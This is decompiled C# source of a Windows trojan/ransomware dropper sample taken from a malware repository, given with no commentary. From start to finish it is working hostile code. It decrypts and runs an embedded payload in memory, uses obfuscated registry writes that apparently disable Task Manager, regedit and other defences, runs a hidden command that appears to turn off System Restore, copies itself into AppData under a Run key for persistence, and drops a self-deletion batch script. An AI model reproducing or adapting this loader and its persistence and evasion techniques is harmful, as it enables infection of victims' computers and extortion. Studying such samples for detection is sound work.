// Decompiled with JetBrains decompiler
// Type: 
// Assembly: ii, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 846E36B7-2CFC-43B3-A135-91C6D46B5F36
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-986a8eeb25f179b162606a52852353d07dcd6cc0c7098f76100102cc2ff7666b.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class \uE002
{
  private static string \uE000 = \uE004.\uE000("\uF0E8\uF0EF\uF0EC\uF0E8\uF0BD\uF0E8\uF0ED\uF0BC\uF0BC\uF0E6\uF0EB\uF0BC\uF0BB\uF0EA\uF0BA\uF0BA\uF0ED\uF0EA\uF0BE\uF0EA\uF0B9\uF0EE\uF0EE\uF0EE\uF0EE\uF0E8\uF0EE\uF0ED\uF0BC\uF0B9\uF0E8\uF0EF", 61656);
  private static string \uE001 = \uE004.\uE000("\uF0E8\uF0EF\uF0EC\uF0E8\uF0BD\uF0E8\uF0ED\uF0BC\uF0BC\uF0E6\uF0EB\uF0BC\uF0BB\uF0EA\uF0BA\uF0BA\uF0ED\uF0EA\uF0BE\uF0EA\uF0B9\uF0EE\uF0EE\uF0EE\uF0EE\uF0E8\uF0EE\uF0ED\uF0BC\uF0B9\uF0E8\uF0EF", 61656);
  private static string \uE002 = \uE004.\uE000("\uF4D8\uF4E2\uF4CC\uF4C5\uF4C0\uF4FB\uF4ED\uF4E3\uF4C7\uF4EA\uF4CC\uF4DB\uF4ED\uF49D\uF4F1\uF49C\uF4DA\uF4F3\uF4CA\uF4C0\uF4F0\uF4E0", 62473);
  private static byte[] \uE003;
  private static bool \uE004 = false;
  private static bool \uE005 = false;
  private static bool \uE006 = false;
  private static bool \uE007 = false;
  private static bool \uE008 = false;
  private static bool \uE009 = false;
  private static bool \uE00A = false;
  private static bool \uE00B = false;
  private static bool \uE00C = false;
  private static bool \uE00D = false;
  private static bool \uE00E = false;
  private static bool \uE00F = false;
  private static bool \uE010 = false;
  private static bool \uE011 = false;
  private static bool \uE012 = false;
  private static bool \uE013 = false;
  private static bool \uE014 = false;
  private static string \uE015 = \uE004.\uE000("\uE3AB\uE39C\uE391\uE388\uE398\uE39B\uE39C\uE396\uE398\uE3B8\uE38F\uE38F\uE392\uE38F\uE3A9\uE394\uE389\uE391\uE398", 58249);
  private static string \uE016 = \uE004.\uE000("\uE780\uE7B7\uE7BA\uE7A3\uE7B3\uE7B0\uE7B7\uE7BD\uE7B3\uE793\uE7A4\uE7A4\uE7B9\uE7A4\uE79B\uE7B3\uE7A5\uE7A5\uE7B7\uE7B1\uE7B3", 59222);
  private static bool \uE017 = false;
  private static bool \uE018 = false;
  private static bool \uE019 = false;
  private static bool \uE01A = false;
  private static bool \uE01B = false;
  private static bool \uE01C = false;
  private static bool \uE01D = false;
  private static string \uE01E = \uE004.\uE000("\uF3BF\uF388\uF385\uF39C\uF38C\uF388\uF39C\uF39D\uF386\uF39A\uF39D\uF388\uF39B\uF39D\uF3A7\uF388\uF384\uF38C\uF3C7\uF38C\uF391\uF38C", 62305);
  private static bool \uE01F = false;

  private static void \uE000(string _param0, string _param1)
  {
    int num = (int) MessageBox.Show(_param0, _param1, MessageBoxButtons.OK, MessageBoxIcon.Hand);
  }

  private static byte[] \uE001(byte[] _param0)
  {
    MemoryStream memoryStream1 = new MemoryStream();
    memoryStream1.Write(_param0, 0, _param0.Length);
    memoryStream1.Position = 0L;
    GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress, true);
    MemoryStream memoryStream2 = new MemoryStream();
    byte[] buffer = new byte[64];
    for (int count = gzipStream.Read(buffer, 0, buffer.Length); count > 0; count = gzipStream.Read(buffer, 0, buffer.Length))
      memoryStream2.Write(buffer, 0, count);
    gzipStream.Close();
    return memoryStream2.ToArray();
  }

  private static byte[] \uE002(string _param0) => Convert.FromBase64String(_param0);

  private static byte[] \uE003(byte[] _param0, string _param1)
  {
    PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(_param1, Encoding.Default.GetBytes(_param1));
    MemoryStream memoryStream = new MemoryStream();
    Rijndael rijndael = Rijndael.Create();
    rijndael.Key = passwordDeriveBytes.GetBytes(32);
    rijndael.IV = passwordDeriveBytes.GetBytes(16);
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
    cryptoStream.Write(_param0, 0, _param0.Length);
    cryptoStream.Close();
    return memoryStream.ToArray();
  }

  public static string \uE004(int _param0)
  {
    string str = \uE004.\uE000("\uE896\uE895\uE894\uE893\uE892\uE891\uE890\uE89F\uE89E\uE897\uE8E6\uE8E5\uE8E4\uE8E3\uE8E2\uE8E1\uE8E0\uE8EF\uE8EE\uE8ED\uE8EC\uE8EB\uE8EA\uE8E9\uE8E8\uE8F7\uE8F6\uE8F5\uE8F4\uE8F3\uE8F2\uE8F1\uE8F0\uE8FF\uE8FE\uE8FD\uE8C6\uE8C5\uE8C4\uE8C3\uE8C2\uE8C1\uE8C0\uE8CF\uE8CE\uE8CD\uE8CC\uE8CB\uE8CA\uE8C9\uE8C8\uE8D7\uE8D6\uE8D5\uE8D4\uE8D3\uE8D2\uE8D1\uE8D0\uE8DF\uE8DE\uE8DD", 59427);
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    for (int index = 0; index < _param0; ++index)
      stringBuilder.Append(str[random.Next(str.Length)]);
    return stringBuilder.ToString();
  }

  private static void \uE005()
  {
    try
    {
      Assembly assembly = Assembly.Load(\uE002.\uE003);
      try
      {
        assembly.EntryPoint.Invoke(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(assembly.EntryPoint.Name)), new object[1]
        {
          (object) new string[0]
        });
      }
      catch
      {
        try
        {
          assembly.EntryPoint.Invoke(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(assembly.EntryPoint.Name)), new object[0]);
        }
        catch
        {
          try
          {
            assembly.EntryPoint.Invoke((object) null, (object[]) null);
          }
          catch
          {
            try
            {
              \uE003.\uE002(string.Empty, Application.ExecutablePath, \uE002.\uE003);
            }
            catch
            {
            }
          }
        }
      }
    }
    catch
    {
      try
      {
        \uE003.\uE002(string.Empty, Application.ExecutablePath, \uE002.\uE003);
      }
      catch
      {
      }
    }
  }

  private static void Main()
  {
    if (!(\uE002.\uE000 == \uE002.\uE001))
      return;
    if (\uE002.\uE014)
    {
      try
      {
        new Thread((ThreadStart) (() => \uE002.\uE000(\uE002.\uE016, \uE002.\uE015))).Start();
      }
      catch
      {
      }
    }
    try
    {
      StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(\uE004.\uE000("\uF2C9\uF2DE\uF2C8\uF2C8\uF2D4\uF2CE\uF2C9\uF2D8\uF2DE", 62123)));
      string end = streamReader.ReadToEnd();
      streamReader.Close();
      \uE002.\uE003 = \uE002.\uE001(\uE002.\uE003(\uE002.\uE002(end), \uE002.\uE002));
      new Thread((ThreadStart) (() => \uE002.\uE005())).Start();
    }
    catch
    {
    }
    if (\uE002.\uE017)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uE1AA\uE196\uE19F\uE18D\uE18E\uE198\uE18B\uE19C\uE1A5\uE1B4\uE190\uE19A\uE18B\uE196\uE18A\uE196\uE19F\uE18D\uE1A5\uE1AE\uE190\uE197\uE19D\uE196\uE18E\uE18A\uE1A5\uE1BA\uE18C\uE18B\uE18B\uE19C\uE197\uE18D\uE1AF\uE19C\uE18B\uE18A\uE190\uE196\uE197\uE1A5\uE1BC\uE181\uE189\uE195\uE196\uE18B\uE19C\uE18B\uE1A5\uE1B8\uE19D\uE18F\uE198\uE197\uE19A\uE19C\uE19D", 57696), true).SetValue(\uE004.\uE000("\uE11B\uE130\uE13F\uE13C\uE132\uE13B\uE11C\uE13F\uE132\uE132\uE131\uE131\uE130\uE10A\uE137\uE12E\uE12D", 57602), (object) \uE004.\uE000("\uEC0F", 60446), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401), true);
        if (registryKey1 == null)
          Registry.CurrentUser.CreateSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401));
        registryKey1.SetValue(\uE004.\uE000("\uF28E\uF2A5\uF2AA\uF2A9\uF2A7\uF2AE\uF287\uF29E\uF28A", 62155), (object) \uE004.\uE000("\uEC0F", 60446), RegistryValueKind.DWord);
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401), true);
        if (registryKey2 == null)
          Registry.LocalMachine.CreateSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401));
        registryKey2.SetValue(\uE004.\uE000("\uF28E\uF2A5\uF2AA\uF2A9\uF2A7\uF2AE\uF287\uF29E\uF28A", 62155), (object) \uE004.\uE000("\uEC0F", 60446), RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (\uE002.\uE018)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uF444\uF478\uF471\uF463\uF460\uF476\uF465\uF472\uF44B\uF447\uF478\uF47B\uF47E\uF474\uF47E\uF472\uF464\uF44B\uF45A\uF47E\uF474\uF465\uF478\uF464\uF478\uF471\uF463\uF44B\uF440\uF47E\uF479\uF473\uF478\uF460\uF464\uF44B\uF444\uF46E\uF464\uF463\uF472\uF47A", 62485), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE004.\uE000("\uF444\uF478\uF471\uF463\uF460\uF476\uF465\uF472\uF44B\uF447\uF478\uF47B\uF47E\uF474\uF47E\uF472\uF464\uF44B\uF45A\uF47E\uF474\uF465\uF478\uF464\uF478\uF471\uF463\uF44B\uF440\uF47E\uF479\uF473\uF478\uF460\uF464\uF44B\uF444\uF46E\uF464\uF463\uF472\uF47A", 62485));
          registryKey.SetValue(\uE004.\uE000("\uE3A8\uE385\uE39F\uE38D\uE38E\uE380\uE389\uE3AF\uE3A1\uE3A8", 58340), (object) \uE004.\uE000("\uEDC2", 60851), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
      if (\uE002.\uE019)
      {
        try
        {
          new Process()
          {
            StartInfo = {
              FileName = \uE004.\uE000("\uF3F1\uF3DA\uF3CB\uF3CC\uF3D7", 62248),
              Arguments = \uE004.\uE000("\uEFDE\uEFFB\uEFE9\uEFF9\uEFF6\uEFED\uEFFA\uEFE8\uEFFE\uEFF3\uEFF3\uEFBF\uEFEC\uEFFA\uEFEB\uEFBF\uEFDC\uEFEA\uEFED\uEFED\uEFFA\uEFF1\uEFEB\uEFEF\uEFED\uEFF0\uEFF9\uEFF6\uEFF3\uEFFA\uEFBF\uEFCC\uEFEB\uEFFE\uEFEB\uEFFA\uEFBF\uEFF0\uEFF9\uEFF9", 61342),
              UseShellExecute = false,
              CreateNoWindow = true
            }
          }.Start();
        }
        catch
        {
        }
      }
      if (\uE002.\uE01A)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401));
          registryKey.SetValue(\uE004.\uE000("\uEEED\uEEC0\uEEDA\uEEC8\uEECB\uEEC5\uEECC\uEEFB\uEECC\uEECE\uEEC0\uEEDA\uEEDD\uEEDB\uEED0\uEEFD\uEEC6\uEEC6\uEEC5\uEEDA", 61097), (object) \uE004.\uE000("\uEDC2", 60851), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
      if (\uE002.\uE01B)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uE585\uE5B9\uE5B0\uE5A2\uE5A1\uE5B7\uE5A4\uE5B3\uE58A\uE59B\uE5BF\uE5B5\uE5A4\uE5B9\uE5A5\uE5B9\uE5B0\uE5A2\uE58A\uE581\uE5BF\uE5B8\uE5B2\uE5B9\uE5A1\uE5A5\uE58A\uE595\uE5A3\uE5A4\uE5A4\uE5B3\uE5B8\uE5A2\uE580\uE5B3\uE5A4\uE5A5\uE5BF\uE5B9\uE5B8\uE58A\uE586\uE5B9\uE5BA\uE5BF\uE5B5\uE5BF\uE5B3\uE5A5\uE58A\uE593\uE5AE\uE5A6\uE5BA\uE5B9\uE5A4\uE5B3\uE5A4", 58706), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE004.\uE000("\uE585\uE5B9\uE5B0\uE5A2\uE5A1\uE5B7\uE5A4\uE5B3\uE58A\uE59B\uE5BF\uE5B5\uE5A4\uE5B9\uE5A5\uE5B9\uE5B0\uE5A2\uE58A\uE581\uE5BF\uE5B8\uE5B2\uE5B9\uE5A1\uE5A5\uE58A\uE595\uE5A3\uE5A4\uE5A4\uE5B3\uE5B8\uE5A2\uE580\uE5B3\uE5A4\uE5A5\uE5BF\uE5B9\uE5B8\uE58A\uE586\uE5B9\uE5BA\uE5BF\uE5B5\uE5BF\uE5B3\uE5A5\uE58A\uE593\uE5AE\uE5A6\uE5BA\uE5B9\uE5A4\uE5B3\uE5A4", 58706));
          registryKey.SetValue(\uE004.\uE000("\uE392\uE3BF\uE3A5\uE3B7\uE3BA\uE3BA\uE3B9\uE3A1\uE384\uE3A3\uE3B8", 58194), (object) \uE004.\uE000("\uEDC2", 60851), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
      if (\uE002.\uE01C)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE004.\uE000("\uEF88\uEFB4\uEFBD\uEFAF\uEFAC\uEFBA\uEFA9\uEFBE\uEF87\uEF96\uEFB2\uEFB8\uEFA9\uEFB4\uEFA8\uEFB4\uEFBD\uEFAF\uEF87\uEF8C\uEFB2\uEFB5\uEFBF\uEFB4\uEFAC\uEFA8\uEF87\uEF98\uEFAE\uEFA9\uEFA9\uEFBE\uEFB5\uEFAF\uEF8D\uEFBE\uEFA9\uEFA8\uEFB2\uEFB4\uEFB5\uEF87\uEF8B\uEFB4\uEFB7\uEFB2\uEFB8\uEFB2\uEFBE\uEFA8\uEF87\uEF88\uEFA2\uEFA8\uEFAF\uEFBE\uEFB6", 61401));
          registryKey.SetValue(\uE004.\uE000("\uE6ED\uE6C0\uE6DA\uE6C8\uE6CB\uE6C5\uE6CC\uE6FD\uE6C8\uE6DA\uE6C2\uE6E4\uE6CE\uE6DB", 58889), (object) \uE004.\uE000("\uEDC2", 60851), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
    }
    if (\uE002.\uE01D)
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \uE004.\uE000("\uE567", 58667) + \uE002.\uE01E;
      try
      {
        Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uE1AA\uE196\uE19F\uE18D\uE18E\uE198\uE18B\uE19C\uE1A5\uE1B4\uE190\uE19A\uE18B\uE196\uE18A\uE196\uE19F\uE18D\uE1A5\uE1AE\uE190\uE197\uE19D\uE196\uE18E\uE18A\uE1A5\uE1BA\uE18C\uE18B\uE18B\uE19C\uE197\uE18D\uE1AF\uE19C\uE18B\uE18A\uE190\uE196\uE197\uE1A5\uE1BC\uE181\uE189\uE195\uE196\uE18B\uE19C\uE18B\uE1A5\uE1B8\uE19D\uE18F\uE198\uE197\uE19A\uE19C\uE19D", 57696), true).SetValue(\uE004.\uE000("\uF5D7\uF5F6\uF5FB\uF5FB\uF5FA\uF5F1", 62751), (object) \uE004.\uE000("\uF5C7", 62773), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        File.WriteAllBytes(path, File.ReadAllBytes(Application.ExecutablePath));
        File.SetAttributes(path, FileAttributes.Hidden);
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey(\uE004.\uE000("\uE6AE\uE692\uE69B\uE689\uE68A\uE69C\uE68F\uE698\uE6A1\uE6B0\uE694\uE69E\uE68F\uE692\uE68E\uE692\uE69B\uE689\uE6A1\uE6AA\uE694\uE693\uE699\uE692\uE68A\uE68E\uE6A1\uE6BE\uE688\uE68F\uE68F\uE698\uE693\uE689\uE6AB\uE698\uE68F\uE68E\uE694\uE692\uE693\uE6A1\uE6AF\uE688\uE693", 59109), true).SetValue(\uE004.\uE000("\uEB38\uEB33\uEB35\uEB29\uEB5A\uEB38\uEB1B\uEB19\uEB11\uEB0F\uEB0A", 60232), (object) path);
        Registry.LocalMachine.OpenSubKey(\uE004.\uE000("\uE6AE\uE692\uE69B\uE689\uE68A\uE69C\uE68F\uE698\uE6A1\uE6B0\uE694\uE69E\uE68F\uE692\uE68E\uE692\uE69B\uE689\uE6A1\uE6AA\uE694\uE693\uE699\uE692\uE68A\uE68E\uE6A1\uE6BE\uE688\uE68F\uE68F\uE698\uE693\uE689\uE6AB\uE698\uE68F\uE68E\uE694\uE692\uE693\uE6A1\uE6AF\uE688\uE693", 59109), true).SetValue(\uE004.\uE000("\uEB38\uEB33\uEB35\uEB29\uEB5A\uEB38\uEB1B\uEB19\uEB11\uEB0F\uEB0A", 60232), (object) path);
      }
      catch
      {
      }
    }
    if (!\uE002.\uE01F)
      return;
    try
    {
      File.WriteAllText(Environment.GetEnvironmentVariable(\uE004.\uE000("\uF668\uF679\uF671\uF66C", 63004)) + \uE004.\uE000("\uE580\uE5B8\uE5B9\uE5B0\uE5B9\uE5A8\uE5B9\uE5F2\uE5BE\uE5BD\uE5A8", 58828), \uE004.\uE000("\uE2CD\uE2A5\uE292\uE287\uE292\uE296\uE283\uE2FD\uE293\uE292\uE29B\uE2D7\uE2D5", 58103) + Application.ExecutablePath + \uE004.\uE000("\uF15D\uF175\uF116\uF119\uF15F\uF11A\uF107\uF116\uF10C\uF10B\uF15F\uF15D", 61817) + Application.ExecutablePath + \uE004.\uE000("\uF39F\uF39D\uF3DA\uF3D2\uF3C9\uF3D2\uF39D\uF3EF\uF3D8\uF3CD\uF3D8\uF3DC\uF3C9", 62369));
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(\uE004.\uE000("\uF668\uF679\uF671\uF66C", 63004)) + \uE004.\uE000("\uE580\uE5B8\uE5B9\uE5B0\uE5B9\uE5A8\uE5B9\uE5F2\uE5BE\uE5BD\uE5A8", 58828)),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }
    catch
    {
    }
  }
}
